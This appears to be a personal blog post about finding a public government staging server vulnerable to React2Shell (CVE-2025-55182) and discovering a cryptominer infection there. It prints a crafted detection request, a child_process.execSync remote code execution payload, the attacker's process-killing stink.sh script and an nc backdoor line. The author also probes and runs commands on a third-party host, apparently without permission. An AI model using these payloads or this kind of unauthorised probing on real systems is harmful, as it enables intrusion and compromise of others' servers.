---
title: "I Found a Cryptominer on a Public Government Pre-Production Host"
date: 2025-12-12T19:55:31+03:00
draft: false
---

*You should now first the website was in publicly exposed pre-production (staging) host used for validating deployments before release*

## Introduction

Hi, when React2Shell (cve-2025-55182) started and I was boring, I turn on my PC to collect as many website I can that infected with this vulnerability, one of the website that I spot is Public-Private Partnership (PPP) it means it is collaboration between government and the private company. 

So the Idea was simple, detect if there is React2Shell then test it, write PoC send the report.

React2Shell: with a maximum CVSS score of 10.0. This vulnerability affects React Server Components (RSC) and the frameworks that implement them, particularly Next.js. The vulnerability, dubbed “React2Shell” by researchers, allows unauthenticated remote code execution through a single crafted HTTP request. - *TryHackMe*
vulnerable versions are 19.0, 19.1.0, 19.1.1, and 19.2.0.

To understand more how it work check this: https://tryhackme.com/room/react2shellcve202555182

CVE-2025-55182 is fundamentally an **unsafe deserialization vulnerability** in how React Server Components handle incoming Flight protocol payloads. The vulnerability exists in the `requireModule` function within the `react-server-dom-webpack` package. Let’s examine the problematic code pattern:

```javascript
function requireModule(metadata) {  
 var moduleExports = __webpack_require__(metadata[0]);  
 // ... additional logic ...  
 return moduleExports[metadata[2]];  // VULNERABLE LINE  
}  
```

The critical flaw is in the bracket notation access `moduleExports[metadata[2]]`. In JavaScript, when we access a property using bracket notation, the engine doesn’t just check the object’s own properties—it traverses the entire prototype chain. This means an attacker can reference properties that weren’t explicitly exported by the module.

## Testing

I send a crafted HTTP request to see if we get the response that indicate if there is React2Shell:
```
POST / HTTP/1.1
Host: xyz:3000
Referer: http://xyz:3000/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarys7yf55w2yfu0m4bv
Content-Length: 232
Next-Action: x
X-Nextjs-Request-Id: x
Next-Router-State-Tree: [[["",{\"children\":[\"__PAGE__\",{}]},null,null,true]]

------WebKitFormBoundarys7yf55w2yfu0m4bv
Content-Disposition: form-data; name="1"

{}
------WebKitFormBoundarys7yf55w2yfu0m4bv
Content-Disposition: form-data; name="0"

["$1:a:a"]
------WebKitFormBoundarys7yf55w2yfu0m4bv--
```
And I got my response that I need
![](/posts/React2Shell/1.png)

So I crafting the payload based in the Write up that I read about and I used `whoami` to see the user that I am currently on:
![](/posts/React2Shell/2.png)
Response:
![](/posts/React2Shell/3.png)
I was a **root** user that is have high privilege.
## botnet, mining service, persistence and more!

in this point I started to write the report to send it, but I said I will run more command to show them that I can read files and edit them. I decided to run `cat /etc/hosts`

![](/posts/React2Shell/4.png)
![](/posts/React2Shell/5.png)

it is like protection from crypto mining **if anything on this system tries to resolve `pool.minexmr.com` or `minexmr.com`, it will resolve to 127.0.0.1 (itself)**
So for all those domains (they’re **well-known Monero/XMR mining pool endpoints**), you’re effectively:
- **blocking outbound mining** to those pools (connections will go to the local machine and fail unless something is listening locally),
- or **redirecting** them to localhost (a “sinkhole”).


Good protection but I am root now :) I can edit this file, 

>Quick question is a miner running right now? so I run:

`top -b -n1 | head -100` to see the process running
So two suspicious running right now:

![](/posts/React2Shell/6.png)

So there some files that I need to check: 
```
/dev/stink.sh
/dev/fghgf -c /dev/ijnegrrinje.json -B
```

**When I open `stink.sh` I discover that server is hit by a mining service attack**

Let me show what happen in this file:
```sh
while true; do
    for proc_dir in /proc/[0-9]*; do
        pid=${proc_dir##*/}

        if strings \"/proc/$pid/exe\" 2>/dev/null | grep -Eq 'xmrig|rondo|UPX 5|futureoftaste'; then
            kill -9 \"$pid\"
            continue
        fi
        result=$(ls -l \"/proc/$pid/exe\" 2>/dev/null)
        case \"$result\" in
            *\"(deleted)\"* | *\"xmrig\"* | *\"hash\"* | *\"watcher\"* | *\"/dev/a\"* | *\"softirq\"* | *\"rondo\"* | *\"UPX 5.02\"* | *\"/tmp/.\"* | *\"kinsing\"* | *\"/tmp/bot\"* | *\"futureoftaste\"* | *\"/tmp/vim\"* | *\"/tmp/docker\"* | *\"/tmp/pew63\"*)
                 kill -9 \"$pid\"
                 ;;
        esac
    done
    pkill -f \"monitorx\"
    rm -rf /tmp/cbee9376_monitorx
    pkill -f  xmrig
    pkill softirq
    pkill -f  watcher
    pkill -f  /tmp/a
    pkill -f  health.sh
    rm -rf /tmp/.XIN-unix
    pkill -f \".XIN-unix\"
    pkill -9  vim
    rm -rf /tmp/vim
    rm -rf /var/www/futureoftaste
    rm -rf /etc/id.services.conf
    pkill -f '/etc/32678'
    pkill -f \"/tmp/runnv/lived.sh\"
    rm -rf /tmp/runnv
    pkill -f \"49nbZB84CgbenDUfv4hxbHJSqgbmSmTsdiJqFyeNF6E4Hbvj8CeF6j1KbFLoWzcvEsZMqZXEedrPZKpYgAbAKrUgLFNzSDz\"
    rm -rf /tmp/xmrig.tar.gz
    pkill -f \"pool.hashvault.pro\"
    rm -rf /tmp/kamd64
    rm -rf /tmp/p.sh
    pkill -f \"/tmp/kamd64\"
    pkill -f \"/tmp/p.sh\"
    pkill -f \"./ddd\"
    pkill -f \"kinsing\"
    rm -rf /etc/data/kinsing
    rm -rf \"$HOME/.local/share/.05bf0e9b\"
    rm -rf /tmp/dockerd
    rm -rf /tmp/docker-daemon
    rm -rf /tmp/update
    pkill -9 \"dockerd\"
    pkill -9 \"/tmp/docker-daemon\"
    pkill -9 \"/tmp/update\"
    rm -rf /etc/rondo/rondo
    rm -rf /etc/profile.d/d.sh
    rm -rf /tmp/*.*
    pkill -f 'zpool|c3pool|nanopool|supportxmr|hashvault|p2pool|skypool|xmrpool|herominers|antpool|monerohash|zergpool|mining-dutch|solopool'
    pkill -f \"fkkkf\"
    rm -rf /tmp/fkkkf # find the nearest rope
    pkill -f \".dnsupd\"
    pkill -f \"n0de\"
    rm -rf /var/tmp/.font/n0de
    pkill -f \"alive.sh\"
    
    sleep 45
done

```


**So here when the impacts increase and I can add more to the report**

It runs **forever**:

1. **Every 45 seconds**, it scans **every running process** (`/proc/[0-9]*`).
2. For each process, it tries to look at the program image (`/proc/$pid/exe`) and:
	- runs `strings` on it and checks for keywords like `xmrig`, `rondo`, `UPX 5`, `kinsing`, `futureoftaste`.
	- if it matches → it immediately does `kill -9 $pid` (force kill).
3. It also checks the `ls -l /proc/$pid/exe` output, and if it sees:
	- `"(deleted)"` (process running from a deleted binary),
	- suspicious names like `watcher`, `softirq`, `/dev/a`, `/tmp/.…`, `kinsing`, etc.
	- then **kill -9** again.
4. After that, it runs a big batch of:
	- `pkill -f ...` to kill processes by name/arguments (xmrig, watcher, softirq, pool domains, etc.)
	- `rm -rf ...` to delete known malware/miner folders and tools (tons under `/tmp`, plus some `/etc` and `/var/www` paths)
5. It even does very destructive wipes:
	- `rm -rf /tmp/*.*` (deletes almost everything in `/tmp` that has a dot in the name)

Why attackers use scripts like this
This kind of script is commonly used by **cryptominer botnets** to:
- remove _other_ miners/botnets so they don’t share CPU,
- kill “defenders” or monitoring tools (sometimes),
- keep the box “clean” for **their** payload.

in the last minute I almost send a request:
`process.mainModule.require('child_process').execSync('cat /dev/ijnegrrinje.json').toString()`
So I can read /dev/ijnegrrinje.json to see what the attacker do!!! but the server give me

![](/posts/React2Shell/7.png)

>I think they patch or block my IP. I was so close to know latest TTP attacks!!!! I want to know how they interacting what their script and I was almost want to download the malware file to analyze them! :( 


Other thing I found is a file create a persistence to the server it was:
![](/posts/React2Shell/8.png)
this open a connection to any one to connect to the server
using: `nc 22.22.22.22 12340`

Other file is creating a backdoor with weak password to enter the server

in crontab list I also find a file
![](/posts/React2Shell/9.png)
it might be also for persistence, it run every time system boot

it was like a party in the server,
do you know why I get forbidden access? I already sent my report to them so they patched it quickly. Now understand how danger is this **vulnerability**

I feel I missed an opportunity to learn from these cyber criminal and tracing them XD
